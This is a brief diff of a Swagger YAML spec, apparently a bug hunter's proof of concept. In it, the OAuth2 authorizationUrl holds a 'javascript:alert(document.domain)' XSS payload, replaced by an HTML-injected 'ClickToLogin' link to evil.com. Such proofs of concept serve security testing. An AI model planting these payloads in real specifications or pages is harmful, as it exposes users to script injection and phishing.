@@ -2,7 +2,7 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: javascript:alert(document.domain)//
+    authorizationUrl: <a href="evil.com"><h1>ClickToLogin<h1></a>
 info:
   version: "1.0.0"
   title: Bug Hunting is an Art & I am an Artist!  __ @iamarit
